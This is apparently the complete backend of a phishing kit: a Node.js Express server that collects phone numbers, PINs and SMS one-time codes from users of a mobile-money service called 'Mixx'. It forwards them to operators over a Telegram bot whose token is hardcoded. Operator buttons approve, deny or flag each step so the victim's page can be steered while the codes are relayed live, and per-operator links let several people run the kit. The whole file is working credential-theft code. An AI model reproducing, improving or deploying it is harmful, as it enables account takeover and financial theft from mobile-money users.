const express = require('express');
const path = require('path');
const TelegramBot = require('node-telegram-bot-api');

const app = express();
app.use(express.json());
app.use(express.static(path.join(__dirname, 'public')));

const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN || '8968023761:AAFi4k2gVczpAbCM1-8oRC1axtXA9EwRvo8';
const MAIN_ADMIN_ID = (process.env.MAIN_ADMIN_ID || '8591555400').trim();

const PORT = process.env.PORT || 10000;
const bot = new TelegramBot(TELEGRAM_BOT_TOKEN, { polling: true });

let activeSessions = {};
let authorizedAdmins = new Set([MAIN_ADMIN_ID]);

function escapeMarkdown(text) {
    if (!text) return '';
    return text.toString().replace(/[_*[\]()~`>#+\-=|{}.!]/g, '\\$&');
}

bot.on('message', (msg) => {
    if (!msg.text) return;
    const chatId = msg.chat.id;
    const userIdStr = chatId.toString().trim();
    const firstName = msg.from.first_name || 'Admin';
    const username = msg.from.username ? `@${msg.from.username}` : 'No username set';

    const host = process.env.RENDER_EXTERNAL_URL || 'https://mixx-by-yas-m5oy.onrender.com';
    const isolatedLink = `${host}/?admin=${userIdStr}`;

    if (msg.text.startsWith('/start')) {
        authorizedAdmins.add(userIdStr);
        const welcomeText = `🚨 *Your Dynamic Admin Link Registered!*\n\n` +
            `👤 *Name:* ${escapeMarkdown(firstName)}\n` +
            `🆔 *Chat ID:* \`${escapeMarkdown(userIdStr)}\`\n` +
            `🏷 *Username:* ${escapeMarkdown(username)}\n\n` +
            `🔗 *Your Isolated Application Link:*\n${isolatedLink}`;

        bot.sendMessage(chatId, welcomeText, { parse_mode: "Markdown" })
            .catch(err => console.error("Error sending start message:", err));
    }
});

bot.on('callback_query', async (query) => {
    const chatId = query.message.chat.id;
    const data = query.data;
    const userIdStr = chatId.toString().trim();

    if (!authorizedAdmins.has(userIdStr)) {
        bot.answerCallbackQuery(query.id, { text: "⚠ You are not authorized!", show_alert: true });
        return;
    }

    const parts = data.split('_');
    const action = parts[0]; 
    const sessionId = parts.slice(1).join('_');

    const session = activeSessions[sessionId];
    if (!session) {
        bot.answerCallbackQuery(query.id, { text: "Session expired or not found.", show_alert: true });
        return;
    }

    if (action === 'allow') {
        session.status = 'approved_pin';
    } else if (action === 'deny') {
        session.status = 'denied';
    } else if (action === 'wrongpin') {
        session.status = 'wrong_pin';
    } else if (action === 'wrongsms') {
        session.status = 'wrong_sms';
    } else if (action === 'approved') {
        session.status = 'success';
    }

    // Fade/remove only the buttons, keeping the original applicant text visible
    bot.editMessageReplyMarkup({ inline_keyboard: [] }, {
        chat_id: chatId,
        message_id: query.message.message_id
    }).catch(err => console.error("Error clearing markup:", err));

    bot.answerCallbackQuery(query.id).catch(err => console.error("Error answering callback query:", err));
});

app.post('/api/submit-credentials', (req, res) => {
    const { sessionId, phone, pin, amount, duration, adminId } = req.body;
    
    // Target the specific sub-admin who generated the link, falling back to main admin
    const targetAdmin = (adminId && authorizedAdmins.has(adminId)) ? adminId : MAIN_ADMIN_ID;

    activeSessions[sessionId] = {
        phone, pin, amount, duration,
        targetAdmin,
        status: 'pending_pin_approval'
    };

    const message = `NEW MIXX APPLICANT\n\n` +
        `PHONE NO: ${phone}\n` +
        `PIN: ${pin}`;

    bot.sendMessage(targetAdmin, message, {
        reply_markup: {
            inline_keyboard: [
                [
                    { text: "📋 Copy", copy_text: { text: `PHONE NO: ${phone}\nPIN: ${pin}` } }
                ],
                [
                    { text: "ALLOW", callback_data: `allow_${sessionId}` },
                    { text: "DENY", callback_data: `deny_${sessionId}` }
                ]
            ]
        }
    }).catch(err => {
        console.error(`CRITICAL Telegram Error:`, err.response ? err.response.body : err.message);
    });

    res.json({ success: true, sessionId });
});

app.post('/api/submit-otp', (req, res) => {
    const { sessionId, otpText } = req.body;
    const session = activeSessions[sessionId];

    if (!session) {
        return res.json({ success: false, message: 'Session not found' });
    }

    session.otpText = otpText;
    session.status = 'pending_final_approval';

    const message = `GOT OTP\nOTP VERIFICATION\n\n` +
        `PHONE NO: ${session.phone}\n\n` +
        `OTP:\n${otpText}`;

    bot.sendMessage(session.targetAdmin, message, {
        reply_markup: {
            inline_keyboard: [
                [
                    { text: "📋 Copy", copy_text: { text: otpText } }
                ],
                [
                    { text: "WRONG PIN ❌", callback_data: `wrongpin_${sessionId}` },
                    { text: "WRONG SMS", callback_data: `wrongsms_${sessionId}` }
                ],
                [
                    { text: "APPROVED", callback_data: `approved_${sessionId}` }
                ]
            ]
        }
    }).catch(err => console.error(`Failed to send OTP alert to admin:`, err));

    res.json({ success: true });
});

app.get('/api/check-status/:sessionId', (req, res) => {
    const session = activeSessions[req.params.sessionId];
    if (!session) {
        return res.json({ status: 'not_found' });
    }
    res.json({ status: session.status });
});

app.listen(PORT, () => {
    console.log(`Server running on port ${PORT}`);
});
    
